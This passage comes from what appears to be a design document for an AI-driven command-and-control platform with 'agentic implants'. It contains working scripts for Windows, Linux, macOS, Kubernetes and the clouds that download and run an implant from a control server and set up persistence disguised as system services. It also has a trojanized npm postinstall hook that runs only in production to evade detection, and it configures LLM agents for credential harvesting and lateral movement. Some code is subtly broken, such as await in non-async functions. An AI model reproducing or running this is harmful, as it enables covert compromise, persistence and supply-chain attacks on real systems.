    console.log(`[RustNexusController] Autonomy level for ${implantId} set to ${level}`);
  }

  /**
   * Emergency kill switch - terminate implant immediately
   */
  async killSwitch(implantId: string): Promise<void> {
    console.warn(`[RustNexusController] KILL SWITCH ACTIVATED for implant: ${implantId}`);

    // Send kill command
    const ws = this.implantConnections.get(implantId);
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'kill' }));
    }

    // Update status
    await db
      .update(agenticImplants)
      .set({ status: 'killed' })
      .where(eq(agenticImplants.id, implantId));

    // Force disconnect
    this.implantConnections.delete(implantId);
    const interval = this.heartbeatIntervals.get(implantId);
    if (interval) {
      clearTimeout(interval);
      this.heartbeatIntervals.delete(implantId);
    }
  }
}

// Singleton instance
export const rustNexusController = new RustNexusController();
```

### Usage Example

```typescript
import { rustNexusController } from '@/server/services/rust-nexus-controller';

// Initialize controller
await rustNexusController.initialize(8443);

// Deploy task to implant
const taskId = await rustNexusController.deployTask('implant-123', {
  id: crypto.randomUUID(),
  type: 'reconnaissance',
  command: 'enumerate_domain',
  parameters: { target: 'corp.local' },
  timeout: 300000,
  priority: 'high'
});

// Check task status
const status = await rustNexusController.getTaskStatus(taskId);
console.log('Task status:', status);

// Rotate keys periodically (every 24 hours)
setInterval(() => {
  const implants = await rustNexusController.getActiveImplants();
  for (const implant of implants) {
    await rustNexusController.rotateKeys(implant.id);
  }
}, 24 * 60 * 60 * 1000);
```

### Estimated Effort
1 week

---

## Implant Deployment

### Deployment Methods

#### 1. Manual Deployment (Interactive)
**Use Case:** Initial testing, high-value targets requiring caution

**Process:**
```bash
# Step 1: Generate implant binary for target platform
$ rtpi-cli implants generate \
  --platform linux \
  --arch x86_64 \
  --autonomy 3 \
  --operation-id op-12345 \
  --output /tmp/implant_linux64

# Step 2: Transfer to target
$ scp /tmp/implant_linux64 user@target:/tmp/

# Step 3: SSH to target and execute
$ ssh user@target
target$ chmod +x /tmp/implant_linux64
target$ ./implant_linux64 --server https://rtpi.local:8443 --register

# Implant registers with control plane and appears in UI
```

**Advantages:**
- Full control over deployment process
- Can verify target environment before deployment
- Suitable for sensitive targets

**Disadvantages:**
- Requires operator interaction
- Time-consuming for multi-target deployments
- Requires valid credentials

#### 2. Post-Exploitation Deployment (Automated)
**Use Case:** Lateral movement, mass deployment after initial access

**Implementation:**
```typescript
// server/services/implant-deployer.ts

import { rustNexusController } from './rust-nexus-controller';
import { db } from '@/shared/db';
import { targets, agenticImplants } from '@/shared/schema';

export class ImplantDeployer {
  /**
   * Deploy implant via post-exploitation
   */
  async deployPostExploit(targetId: string, options: DeployOptions): Promise<string> {
    const target = await db.query.targets.findFirst({
      where: (targets, { eq }) => eq(targets.id, targetId)
    });

    if (!target) {
      throw new Error(`Target ${targetId} not found`);
    }

    // Select deployment method based on target platform
    let deployScript: string;
    switch (target.platform) {
      case 'windows':
        deployScript = this.generateWindowsDeployScript(target, options);
        break;
      case 'linux':
        deployScript = this.generateLinuxDeployScript(target, options);
        break;
      case 'macos':
        deployScript = this.generateMacOSDeployScript(target, options);
        break;
      default:
        throw new Error(`Unsupported platform: ${target.platform}`);
    }

    // Execute deployment via existing access (Metasploit session, SSH, etc.)
    const result = await this.executeDeployment(target, deployScript);

    if (result.success) {
      console.log(`[ImplantDeployer] Implant deployed to ${target.ip}`);
      return result.implantId;
    } else {
      throw new Error(`Deployment failed: ${result.error}`);
    }
  }

  /**
   * Generate Windows deployment script (PowerShell)
   */
  private generateWindowsDeployScript(target: any, options: DeployOptions): string {
    return `
# PowerShell deployment script
$implantUrl = "https://rtpi.local/api/v1/implants/binaries/win64.exe"
$implantPath = "$env:TEMP\\svchost.exe"

# Download implant
Invoke-WebRequest -Uri $implantUrl -OutFile $implantPath -UseBasicParsing

# Set execution attributes
Set-ItemProperty -Path $implantPath -Name Attributes -Value "Hidden,System"

# Execute implant
Start-Process -FilePath $implantPath -ArgumentList "--server https://rtpi.local:8443 --operation ${options.operationId} --autonomy ${options.autonomyLevel}" -WindowStyle Hidden

# Establish persistence (optional)
$action = New-ScheduledTaskAction -Execute $implantPath
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -RunLevel Highest
    `.trim();
  }

  /**
   * Generate Linux deployment script (Bash)
   */
  private generateLinuxDeployScript(target: any, options: DeployOptions): string {
    return `
#!/bin/bash
# Linux deployment script
IMPLANT_URL="https://rtpi.local/api/v1/implants/binaries/linux64"
IMPLANT_PATH="/tmp/.systemd-agent"

# Download implant
curl -k -o $IMPLANT_PATH $IMPLANT_URL
chmod +x $IMPLANT_PATH

# Execute in background
nohup $IMPLANT_PATH --server https://rtpi.local:8443 --operation ${options.operationId} --autonomy ${options.autonomyLevel} > /dev/null 2>&1 &

# Establish persistence via crontab
(crontab -l 2>/dev/null; echo "@reboot $IMPLANT_PATH --server https://rtpi.local:8443 --operation ${options.operationId}") | crontab -

# Or systemd service (if root)
if [ $(id -u) -eq 0 ]; then
  cat > /etc/systemd/system/system-monitor.service <<EOF
[Unit]
Description=System Monitor Service
After=network.target

[Service]
ExecStart=$IMPLANT_PATH --server https://rtpi.local:8443 --operation ${options.operationId}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
  systemctl enable system-monitor.service
  systemctl start system-monitor.service
fi
    `.trim();
  }

  /**
   * Generate macOS deployment script
   */
  private generateMacOSDeployScript(target: any, options: DeployOptions): string {
    return `
#!/bin/bash
# macOS deployment script
IMPLANT_URL="https://rtpi.local/api/v1/implants/binaries/macos64"
IMPLANT_PATH="$HOME/Library/.system-agent"

# Download implant
curl -k -o $IMPLANT_PATH $IMPLANT_URL
chmod +x $IMPLANT_PATH

# Execute
nohup $IMPLANT_PATH --server https://rtpi.local:8443 --operation ${options.operationId} --autonomy ${options.autonomyLevel} > /dev/null 2>&1 &

# Persistence via LaunchAgent
cat > $HOME/Library/LaunchAgents/com.apple.systemagent.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.apple.systemagent</string>
  <key>ProgramArguments</key>
  <array>
    <string>$IMPLANT_PATH</string>
    <string>--server</string>
    <string>https://rtpi.local:8443</string>
    <string>--operation</string>
    <string>${options.operationId}</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
</dict>
</plist>
EOF
launchctl load $HOME/Library/LaunchAgents/com.apple.systemagent.plist
    `.trim();
  }
}

export const implantDeployer = new ImplantDeployer();
```

**Usage:**
```typescript
// Deploy implant after exploiting target
const implantId = await implantDeployer.deployPostExploit('target-123', {
  operationId: 'op-456',
  autonomyLevel: 5,
  persistence: true
});
```

#### 3. Container-Based Deployment
**Use Case:** Cloud-native targets, Kubernetes clusters, containerized environments

**Docker-based Implant:**
```dockerfile
# Dockerfile for containerized implant
FROM alpine:latest

RUN apk add --no-cache ca-certificates curl bash python3

COPY implant_linux64 /usr/local/bin/implant
RUN chmod +x /usr/local/bin/implant

ENV SERVER_URL="https://rtpi.local:8443"
ENV OPERATION_ID=""
ENV AUTONOMY_LEVEL="3"

CMD ["/usr/local/bin/implant", "--server", "$SERVER_URL", "--operation", "$OPERATION_ID", "--autonomy", "$AUTONOMY_LEVEL"]
```

**Deployment to Kubernetes:**
```yaml
# kubernetes-implant.yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: system-monitor
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: system-monitor
  template:
    metadata:
      labels:
        app: system-monitor
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: monitor
        image: rtpi.local/implants/rust-nexus:latest
        env:
        - name: SERVER_URL
          value: "https://rtpi.local:8443"
        - name: OPERATION_ID
          value: "op-789"
        - name: AUTONOMY_LEVEL
          value: "4"
        securityContext:
          privileged: true
        volumeMounts:
        - name: host
          mountPath: /host
      volumes:
      - name: host
        hostPath:
          path: /
```

**Advantages:**
- Portable across container platforms
- Easy to replicate
- Good for cloud environments

#### 4. Cloud Instance Deployment (AWS/Azure/GCP)
**Use Case:** Cloud penetration testing, red team operations in cloud environments

**AWS EC2 User Data Deployment:**
```bash
#!/bin/bash
# EC2 User Data script

# Install dependencies
yum install -y curl

# Download and execute implant
curl -k -o /usr/local/bin/implant https://rtpi.local/api/v1/implants/binaries/linux64
chmod +x /usr/local/bin/implant

# Get instance metadata
INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id)
INSTANCE_TYPE=$(curl -s http://169.254.169.254/latest/meta-data/instance-type)
AZ=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)

# Execute with cloud metadata
/usr/local/bin/implant \
  --server https://rtpi.local:8443 \
  --operation op-cloud-123 \
  --autonomy 4 \
  --metadata "instance_id=$INSTANCE_ID,type=$INSTANCE_TYPE,az=$AZ"
```

**Azure VM Custom Script Extension:**
```powershell
# Azure custom script for Windows VM
$implantUrl = "https://rtpi.local/api/v1/implants/binaries/win64.exe"
$implantPath = "C:\Windows\System32\svchost-agent.exe"

Invoke-WebRequest -Uri $implantUrl -OutFile $implantPath -UseBasicParsing

# Get Azure metadata
$metadata = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -Headers @{"Metadata"="true"}

# Execute with Azure context
Start-Process -FilePath $implantPath -ArgumentList "--server https://rtpi.local:8443 --operation op-azure-456 --autonomy 5 --metadata `"subscription=$($metadata.compute.subscriptionId),resourceGroup=$($metadata.compute.resourceGroupName)`"" -WindowStyle Hidden
```

**GCP Startup Script:**
```bash
#!/bin/bash
# GCP Compute Engine startup script

curl -k -o /usr/local/bin/implant https://rtpi.local/api/v1/implants/binaries/linux64
chmod +x /usr/local/bin/implant

# Get GCP metadata
PROJECT_ID=$(curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id)
ZONE=$(curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/zone)

/usr/local/bin/implant \
  --server https://rtpi.local:8443 \
  --operation op-gcp-789 \
  --autonomy 4 \
  --metadata "project=$PROJECT_ID,zone=$ZONE"
```

**Advantages:**
- Leverages cloud infrastructure
- Automatic deployment at instance launch
- Good for persistent access

#### 5. Supply Chain Deployment (Advanced)
**Use Case:** APT simulation, software supply chain testing

**Trojanized Package:**
```javascript
// package.json post-install script
{
  "name": "enterprise-analytics",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node deploy-telemetry.js"
  }
}

// deploy-telemetry.js
const https = require('https');
const { exec } = require('child_process');
const os = require('os');

function deployImplant() {
  const platform = os.platform();
  const implantUrl = `https://rtpi.local/api/v1/implants/binaries/${platform}64`;
  const implantPath = platform === 'win32' ?
    'C:\\Windows\\Temp\\.analytics.exe' :
    '/tmp/.analytics';

  // Download implant
  https.get(implantUrl, (res) => {
    const fileStream = fs.createWriteStream(implantPath);
    res.pipe(fileStream);
    fileStream.on('finish', () => {
      fileStream.close();
      // Execute
      exec(`${implantPath} --server https://rtpi.local:8443 --operation op-supply-chain --autonomy 6`, {
        detached: true,
        stdio: 'ignore'
      }).unref();
    });
  });
}

// Only deploy in production environments (to avoid detection during testing)
if (process.env.NODE_ENV === 'production') {
  deployImplant();
}
```

### Deployment Workflow

```typescript
// Complete deployment process with RTPI integration

// Step 1: Generate implant binary with unique configuration
const implantConfig = {
  id: crypto.randomUUID(),
  operationId: 'op-123',
  platform: 'linux',
  arch: 'x86_64',
  agentType: 'anthropic',
  agentModel: 'claude-3.5-sonnet',
  autonomyLevel: 5,
  capabilities: ['reconnaissance', 'lateral_movement', 'credential_harvesting'],
  serverUrl: 'https://rtpi.local:8443',
  encryptionKey: crypto.randomBytes(32).toString('hex'),
  authToken: crypto.randomBytes(32).toString('hex')
};

// Step 2: Compile implant with embedded configuration (calls rust-nexus compiler)
const binaryPath = await implantCompiler.compile(implantConfig);

// Step 3: Choose deployment method
const deploymentMethod = 'post_exploit'; // or 'manual', 'container', 'cloud'

// Step 4: Deploy to target
const deploymentResult = await implantDeployer.deploy({
  targetId: 'target-456',
  binaryPath,
  method: deploymentMethod,
  persistence: true
});

// Step 5: Wait for implant registration
const implant = await waitForRegistration(implantConfig.id, { timeout: 60000 });

// Step 6: Verify connectivity
const healthCheck = await rustNexusController.sendCommand(implant.id, {
  type: 'ping'
});

if (healthCheck.success) {
  console.log('✅ Implant deployed and operational');

  // Step 7: Begin heartbeat monitoring (automatic)
  // Step 8: Add to operation dashboard
  await assignImplantToOperation(implant.id, implantConfig.operationId);
} else {
  console.error('❌ Deployment failed - rolling back');
  await rollbackDeployment(deploymentResult.deploymentId);
}
```

### Implementation Checklist
- [ ] Create implant deployment wizard UI
- [ ] Integrate with rust-nexus compiler for binary generation
- [ ] Implement multi-platform deployment scripts
- [ ] Add deployment verification and health checks
- [ ] Implement rollback on failure
- [ ] Create deployment history and audit log
- [ ] Add deployment templates for common scenarios
- [ ] Test all deployment methods (manual, automated, container, cloud)

### Deployment Wizard UI Component

```typescript
// client/src/components/implants/DeploymentWizard.tsx

import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Select } from '@/components/ui/select';
import { Input } from '@/components/ui/input';

interface DeploymentWizardProps {
  operationId: string;
  targetId?: string;
  onComplete: (implantId: string) => void;
}

export function DeploymentWizard({ operationId, targetId, onComplete }: DeploymentWizardProps) {
  const [step, setStep] = useState(1);
  const [config, setConfig] = useState({
    platform: 'linux',
    arch: 'x86_64',
    agentType: 'anthropic',
    agentModel: 'claude-3.5-sonnet',
    autonomyLevel: 3,
    deploymentMethod: 'manual',
    persistence: false
  });

  const steps = [
    { id: 1, title: 'Platform Configuration' },
    { id: 2, title: 'AI Agent Setup' },
    { id: 3, title: 'Deployment Method' },
    { id: 4, title: 'Deploy & Verify' }
  ];

  async function handleDeploy() {
    const response = await fetch('/api/v1/implants/deploy', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        operationId,
        targetId,
        ...config
      })
    });

    const result = await response.json();

    if (result.success) {
      onComplete(result.implantId);
    }
  }

  return (
    <div className="deployment-wizard">
      <div className="steps">
        {steps.map((s) => (
          <div key={s.id} className={step >= s.id ? 'active' : ''}>
            {s.title}
          </div>
        ))}
      </div>

      {step === 1 && (
        <div>
          <Select
            label="Platform"
            value={config.platform}
            onChange={(v) => setConfig({ ...config, platform: v })}
            options={[
              { value: 'windows', label: 'Windows' },
              { value: 'linux', label: 'Linux' },
              { value: 'macos', label: 'macOS' }
            ]}
          />
          <Select
            label="Architecture"
            value={config.arch}
            onChange={(v) => setConfig({ ...config, arch: v })}
            options={[
              { value: 'x86_64', label: 'x86_64 (64-bit)' },
              { value: 'arm64', label: 'ARM64' }
            ]}
          />
        </div>
      )}

      {step === 2 && (
        <div>
          <Select
            label="AI Provider"
            value={config.agentType}
            onChange={(v) => setConfig({ ...config, agentType: v })}
            options={[
              { value: 'anthropic', label: 'Anthropic (Claude)' },
              { value: 'openai', label: 'OpenAI (GPT-4)' },
              { value: 'local', label: 'Local LLM' }
            ]}
          />
          <Input
            type="range"
            label={`Autonomy Level: ${config.autonomyLevel}`}
            min={1}
            max={10}
            value={config.autonomyLevel}
            onChange={(e) => setConfig({ ...config, autonomyLevel: parseInt(e.target.value) })}
          />
        </div>
      )}

      {step === 3 && (
        <div>
          <Select
            label="Deployment Method"
            value={config.deploymentMethod}
            onChange={(v) => setConfig({ ...config, deploymentMethod: v })}
            options={[
              { value: 'manual', label: 'Manual (SSH/RDP)' },
              { value: 'post_exploit', label: 'Automated (Post-Exploit)' },
              { value: 'container', label: 'Container (Docker/K8s)' },
              { value: 'cloud', label: 'Cloud (AWS/Azure/GCP)' }
            ]}
          />
          <label>
            <input
              type="checkbox"
              checked={config.persistence}
              onChange={(e) => setConfig({ ...config, persistence: e.target.checked })}
            />
            Enable persistence mechanisms
          </label>
        </div>
      )}

      {step === 4 && (
        <div>
          <h3>Ready to Deploy</h3>
          <pre>{JSON.stringify(config, null, 2)}</pre>
          <Button onClick={handleDeploy}>Deploy Implant</Button>
        </div>
      )}

      <div className="navigation">
        {step > 1 && <Button onClick={() => setStep(step - 1)}>Back</Button>}
        {step < 4 && <Button onClick={() => setStep(step + 1)}>Next</Button>}
      </div>
    </div>
  );
}
```

### Estimated Effort
3-4 days

---

## Task Distribution

### Distributed Task Execution

The Task Distribution Engine intelligently routes workflow tasks to the most suitable implant based on multiple factors including platform compatibility, current load, network proximity, and capabilities.

#### Complete Implementation

```typescript
// server/services/task-distributor.ts

import { db } from '@/shared/db';
import { agenticImplants, implantTasks, workflowTasks } from '@/shared/schema';
import { eq } from 'drizzle-orm';
import { rustNexusController } from './rust-nexus-controller';

interface Task {
  id: string;
  type: string;
  command: string;
  parameters: Record<string, any>;
  requiredPlatform?: 'windows' | 'linux' | 'macos';
  requiredCapabilities?: string[];
  priority: 'low' | 'medium' | 'high' | 'critical';
  timeout: number;
  targetNetwork?: string;
}

interface Implant {
  id: string;
  hostname: string;
  platform: 'windows' | 'linux' | 'macos';
  status: string;
  agentCapabilities: string[];
  autonomyLevel: number;
  cpuUsage: number;
  memoryUsage: number;
  networkLatency: number;
  ipAddress: string;
  lastHeartbeat: Date;
}

interface ImplantScore {
  implant: Implant;
  totalScore: number;
  breakdown: {
    platform: number;
    capability: number;
    load: number;
    latency: number;
    proximity: number;
  };
}

export class DistributedWorkflowExecutor {
  /**
   * Execute workflow across multiple implants
   */
  async executeDistributed(
    workflowId: string,
    tasks: Task[],
    implantIds?: string[]
  ): Promise<ExecutionResult> {
    console.log(`[TaskDistributor] Executing workflow ${workflowId} with ${tasks.length} tasks`);

    // Get available implants (specific set or all active)
    const availableImplants = implantIds
      ? await this.getSpecificImplants(implantIds)
      : await this.getActiveImplants();

    if (availableImplants.length === 0) {
      throw new Error('No active implants available for task distribution');
    }

    // Distribute tasks across implants
    const taskAssignments = await this.assignTasksToImplants(tasks, availableImplants);

    // Deploy tasks to implants
    const deploymentPromises = taskAssignments.map(({ task, implant }) =>
      this.deployTaskToImplant(task, implant)
    );

    const deployments = await Promise.allSettled(deploymentPromises);

    // Monitor execution
    const taskIds = deployments
      .filter((d) => d.status === 'fulfilled')
      .map((d) => (d as PromiseFulfilledResult<string>).value);

    const results = await this.monitorExecution(taskIds);

    // Aggregate results
    return this.aggregateResults(workflowId, results);
  }

  /**
   * Assign tasks to best-suited implants
   */
  private async assignTasksToImplants(
    tasks: Task[],
    implants: Implant[]
  ): Promise<Array<{ task: Task; implant: Implant }>> {
    const assignments: Array<{ task: Task; implant: Implant }> = [];

    // Sort tasks by priority
    const sortedTasks = [...tasks].sort((a, b) => {
      const priorityOrder = { critical: 4, high: 3, medium: 2, low: 1 };
      return priorityOrder[b.priority] - priorityOrder[a.priority];
    });

    // Assign each task to best implant
    for (const task of sortedTasks) {
      const bestImplant = this.selectBestImplant(task, implants);

      if (!bestImplant) {
        console.warn(`[TaskDistributor] No suitable implant found for task ${task.id}`);
        continue;
      }

      assignments.push({ task, implant: bestImplant });

      // Update virtual load for next assignment (prevents overloading single implant)
      const implantIndex = implants.findIndex((i) => i.id === bestImplant.id);
      if (implantIndex !== -1) {
        implants[implantIndex].cpuUsage = Math.min(1.0, bestImplant.cpuUsage + 0.1);
      }
    }

    return assignments;
  }

  /**
   * Select best implant for a task using weighted scoring algorithm
   */
  private selectBestImplant(task: Task, implants: Implant[]): Implant | null {
    const scores: ImplantScore[] = implants
      .filter((implant) => {
        // Filter out disconnected or killed implants
        if (implant.status !== 'active' && implant.status !== 'idle') {
          return false;
        }

        // Filter by platform if required
        if (task.requiredPlatform && implant.platform !== task.requiredPlatform) {
          return false;
        }

        // Filter by required capabilities
        if (task.requiredCapabilities) {
          const hasCapabilities = task.requiredCapabilities.every((cap) =>
            implant.agentCapabilities.includes(cap)
          );
          if (!hasCapabilities) {
            return false;
          }
        }

        return true;
      })
      .map((implant) => {
        // Weight: Platform compatibility (30%)
        const platformScore = task.requiredPlatform && implant.platform === task.requiredPlatform
          ? 30
          : implant.platform === 'linux' // Prefer Linux as most versatile
          ? 15
          : 10;

        // Weight: Capability match (25%)
        let capabilityScore = 0;
        if (task.requiredCapabilities) {
          const matchCount = task.requiredCapabilities.filter((cap) =>
            implant.agentCapabilities.includes(cap)
          ).length;
          capabilityScore = (matchCount / task.requiredCapabilities.length) * 25;
        } else {
          capabilityScore = 15; // Neutral score if no specific capabilities required
        }

        // Weight: Current load (20%)
        const loadScore = (1 - implant.cpuUsage) * 20;

        // Weight: Network latency (15%)
        const latencyScore = Math.max(0, (1000 - implant.networkLatency) / 1000) * 15;

        // Weight: Network proximity (10%)
        let proximityScore = 0;
        if (task.targetNetwork && implant.ipAddress) {
          const isOnSameSubnet = this.isSameSubnet(
            task.targetNetwork,
            implant.ipAddress
          );
          proximityScore = isOnSameSubnet ? 10 : 0;
        } else {
          proximityScore = 5; // Neutral score
        }

        const totalScore =
          platformScore + capabilityScore + loadScore + latencyScore + proximityScore;

        return {
          implant,
          totalScore,
          breakdown: {
            platform: platformScore,
            capability: capabilityScore,
            load: loadScore,
            latency: latencyScore,
            proximity: proximityScore
          }
        };
      });

    // Sort by total score (highest first)
    scores.sort((a, b) => b.totalScore - a.totalScore);

    if (scores.length === 0) {
      return null;
    }

    const winner = scores[0];
    console.log(`[TaskDistributor] Selected implant ${winner.implant.id} (score: ${winner.totalScore.toFixed(2)})`, winner.breakdown);

    return winner.implant;
  }

  /**
   * Deploy task to specific implant
   */
  private async deployTaskToImplant(task: Task, implant: Implant): Promise<string> {
    try {
      const taskId = await rustNexusController.deployTask(implant.id, {
        id: task.id,
        type: task.type,
        command: task.command,
        parameters: task.parameters,
        timeout: task.timeout,
        priority: task.priority
      });

      console.log(`[TaskDistributor] Deployed task ${task.id} to implant ${implant.id} (taskId: ${taskId})`);

      return taskId;
    } catch (error) {
      console.error(`[TaskDistributor] Failed to deploy task ${task.id}:`, error);
      throw error;
    }
  }

  /**
   * Monitor task execution with retries
   */
  private async monitorExecution(taskIds: string[]): Promise<TaskResult[]> {
    const results: TaskResult[] = [];
    const pendingTasks = new Set(taskIds);
    const maxAttempts = 60; // 60 attempts * 5 seconds = 5 minutes max wait
    let attempt = 0;

    while (pendingTasks.size > 0 && attempt < maxAttempts) {
      await new Promise((resolve) => setTimeout(resolve, 5000)); // Poll every 5 seconds

      for (const taskId of pendingTasks) {
        const status = await rustNexusController.getTaskStatus(taskId);

        if (!status) {
          console.warn(`[TaskDistributor] Task ${taskId} not found`);
          pendingTasks.delete(taskId);
          continue;
        }

        if (status.status === 'completed' || status.status === 'failed') {
          results.push({
            taskId,
            status: status.status,
            result: status.result,
            error: status.error
          });
          pendingTasks.delete(taskId);
        }
      }

      attempt++;
    }

    // Handle tasks that timed out
    for (const taskId of pendingTasks) {
      results.push({
        taskId,
        status: 'failed',
        error: 'Task execution timeout'
      });
    }

    return results;
  }

  /**
   * Aggregate results from multiple tasks
   */
  private aggregateResults(workflowId: string, taskResults: TaskResult[]): ExecutionResult {
    const successful = taskResults.filter((r) => r.status === 'completed');
    const failed = taskResults.filter((r) => r.status === 'failed');

    return {
      workflowId,
      totalTasks: taskResults.length,
      successful: successful.length,
      failed: failed.length,
      results: taskResults,
      overallStatus: failed.length === 0 ? 'completed' : 'partial_failure'
    };
  }

  /**
   * Check if two IP addresses are on the same subnet
   */
  private isSameSubnet(ip1: string, ip2: string): boolean {
    const subnet1 = ip1.split('.').slice(0, 3).join('.');
    const subnet2 = ip2.split('.').slice(0, 3).join('.');
    return subnet1 === subnet2;
  }

  /**
   * Get active implants
   */
  private async getActiveImplants(): Promise<Implant[]> {
    return await db
      .select()
      .from(agenticImplants)
      .where(eq(agenticImplants.status, 'active'));
  }

  /**
   * Get specific implants by IDs
   */
  private async getSpecificImplants(implantIds: string[]): Promise<Implant[]> {
    const implants: Implant[] = [];

    for (const id of implantIds) {
      const implant = await db.query.agenticImplants.findFirst({
        where: (implants, { eq }) => eq(implants.id, id)
      });

      if (implant) {
        implants.push(implant as Implant);
      }
    }

    return implants;
  }

  /**
   * Handle task failure with retry logic
   */
  async retryFailedTask(taskId: string, maxRetries: number = 3): Promise<void> {
    const task = await db.query.implantTasks.findFirst({
      where: (tasks, { eq }) => eq(tasks.id, taskId)
    });

    if (!task || task.status !== 'failed') {
      return;
    }

    // Get all available implants except the one that failed
    const implants = await this.getActiveImplants();
    const availableImplants = implants.filter((i) => i.id !== task.implantId);

    if (availableImplants.length === 0) {
      console.error(`[TaskDistributor] No alternative implants available for retry`);
      return;
    }

    // Select new implant
    const newImplant = this.selectBestImplant(
      {
        id: task.id,
        type: task.type,
        command: task.command,
        parameters: task.parameters as Record<string, any>,
        priority: task.priority,
        timeout: task.timeout
      },
      availableImplants
    );

    if (!newImplant) {
      console.error(`[TaskDistributor] No suitable implant for retry`);
      return;
    }

    // Retry deployment
    console.log(`[TaskDistributor] Retrying task ${taskId} on implant ${newImplant.id}`);

    await this.deployTaskToImplant(
      {
        id: task.id,
        type: task.type,
        command: task.command,
        parameters: task.parameters as Record<string, any>,
        priority: task.priority,
        timeout: task.timeout
      },
      newImplant
    );
  }
}

export const taskDistributor = new DistributedWorkflowExecutor();

interface TaskResult {
  taskId: string;
  status: 'completed' | 'failed';
  result?: any;
  error?: string;
}

interface ExecutionResult {
  workflowId: string;
  totalTasks: number;
  successful: number;
  failed: number;
  results: TaskResult[];
  overallStatus: 'completed' | 'partial_failure' | 'failed';
}
```

### Load Balancing Strategies

#### 1. Round Robin (Simple)
```typescript
private roundRobinIndex = 0;

selectImplantRoundRobin(implants: Implant[]): Implant {
  const implant = implants[this.roundRobinIndex % implants.length];
  this.roundRobinIndex++;
  return implant;
}
```

#### 2. Weighted (Based on capabilities and load)
Uses the scoring algorithm above (default strategy).

#### 3. Geo-aware (Prefer same network segment)
```typescript
selectImplantGeoAware(task: Task, implants: Implant[]): Implant {
  const sameSubnet = implants.filter((i) =>
    this.isSameSubnet(task.targetNetwork, i.ipAddress)
  );

  return sameSubnet.length > 0
    ? this.selectBestImplant(task, sameSubnet)
    : this.selectBestImplant(task, implants);
}
```

#### 4. Sticky Sessions (Keep related tasks on same implant)
```typescript
private taskToImplantMap = new Map<string, string>();

selectImplantSticky(task: Task, implants: Implant[], sessionKey: string): Implant {
  // Check if we have a previous assignment for this session
  const previousImplantId = this.taskToImplantMap.get(sessionKey);

  if (previousImplantId) {
    const implant = implants.find((i) => i.id === previousImplantId);
    if (implant && implant.status === 'active') {
      return implant;
    }
  }

  // No previous assignment or implant unavailable - select new one
  const selected = this.selectBestImplant(task, implants);
  this.taskToImplantMap.set(sessionKey, selected.id);
  return selected;
}
```

### Implementation Checklist
- [ ] Create distributed executor service
- [ ] Implement weighted scoring algorithm (platform 30%, capability 25%, load 20%, latency 15%, proximity 10%)
- [ ] Add load balancing strategies (round robin, weighted, geo-aware, sticky)
- [ ] Implement task queuing with priority
- [ ] Add result aggregation
- [ ] Handle task failures with automatic retry
- [ ] Add task monitoring and status tracking
- [ ] Implement fallback mechanisms for implant failures

### Estimated Effort
4-5 days

---

## Secure Communication

### Security Architecture

Agentic implants communicate with the control plane through multiple layers of security to ensure confidentiality, integrity, and authentication.

#### Multi-Layer Security Model

```
┌─────────────────────────────────────────────────────────────┐
│                   Application Layer                          │
│  ┌────────────────────────────────────────────────────────┐ │
│  │  AES-256-GCM Encryption (Per-message)                   │ │
│  │  - Unique key per implant                               │ │
│  │  - Rotated every 6 hours                                │ │
│  │  - ECDH key exchange for session keys                   │ │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│                   Transport Layer                            │
│  ┌────────────────────────────────────────────────────────┐ │
│  │  Mutual TLS 1.3                                         │ │
│  │  - Client certificate authentication                    │ │
│  │  - Certificate pinning                                  │ │
│  │  - Perfect forward secrecy                              │ │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│                   Network Layer                              │
│  ┌────────────────────────────────────────────────────────┐ │
│  │  Optional VPN/Tunnel                                    │ │
│  │  - For additional obfuscation                           │ │
│  │  - Domain fronting (research environments)              │ │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### Encryption

#### 1. End-to-End Encryption (AES-256-GCM)
Every message between control plane and implant is encrypted at the application layer.

```typescript
// server/services/secure-communication.ts

import crypto from 'crypto';

export class SecureCommunication {
  /**
   * Encrypt message for specific implant
   */
  encryptMessage(implantId: string, message: any): EncryptedMessage {
    // Get implant's current encryption key from database
    const implant = await db.query.agenticImplants.findFirst({
      where: (implants, { eq }) => eq(implants.id, implantId)
    });

    if (!implant) {
      throw new Error(`Implant ${implantId} not found`);
    }

    const key = Buffer.from(implant.encryptionKey, 'hex');
    const iv = crypto.randomBytes(12); // 96-bit IV for GCM
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);

    const plaintext = JSON.stringify(message);
    const encrypted = Buffer.concat([
      cipher.update(plaintext, 'utf8'),
      cipher.final()
    ]);

    const authTag = cipher.getAuthTag();

    return {
      ciphertext: encrypted.toString('base64'),
      iv: iv.toString('base64'),
      authTag: authTag.toString('base64'),
      timestamp: Date.now()
    };
  }

  /**
   * Decrypt message from implant
   */
  decryptMessage(implantId: string, encryptedMessage: EncryptedMessage): any {
    const implant = await db.query.agenticImplants.findFirst({
      where: (implants, { eq }) => eq(implants.id, implantId)
    });

    if (!implant) {
      throw new Error(`Implant ${implantId} not found`);
    }

